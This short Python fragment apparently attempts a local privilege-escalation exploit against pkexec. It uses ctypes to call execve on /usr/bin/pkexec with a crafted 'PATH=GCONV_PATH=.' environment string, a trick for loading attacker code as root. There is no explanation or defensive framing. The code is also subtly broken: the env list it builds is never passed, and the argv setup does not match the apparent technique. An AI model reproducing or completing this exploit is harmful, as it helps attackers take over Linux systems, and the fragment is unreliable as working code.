from ctypes import CDLL, c_char_p

def invoke(envp):
    env = [b"PATH=GCONV_PATH=."]
    native = CDLL("libc.so.6")
    argv = (c_char_p * 3)(b"pkexec", b"/usr/bin/id", None)
    native.execve(b"/usr/bin/pkexec", argv, envp)
